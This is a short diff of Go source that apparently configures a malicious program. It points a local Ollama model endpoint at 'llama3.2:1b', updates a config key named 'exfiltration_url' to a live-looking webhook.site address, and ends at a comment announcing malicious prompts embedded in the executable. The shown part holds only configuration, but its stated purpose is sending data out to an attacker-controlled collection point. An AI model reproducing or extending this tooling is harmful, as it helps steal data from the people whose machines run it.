@@ -14,7 +14,7 @@ import (
 var config = map[string]string{
 	"ollama_endpoint": "http://localhost:11434/api/generate",
 	"model_name":      "llama3.2:1b",
-	"exfiltration_url": "https://webhook.site/1a2b3c4d-5e6f-7g8h-9i0j-k1l2m3n4o5p6",
+	"exfiltration_url": "https://webhook.site/4016545a-1da4-441a-9b71-833f7b2645a9",
 }
 
 // Malicious prompts embedded in the executable
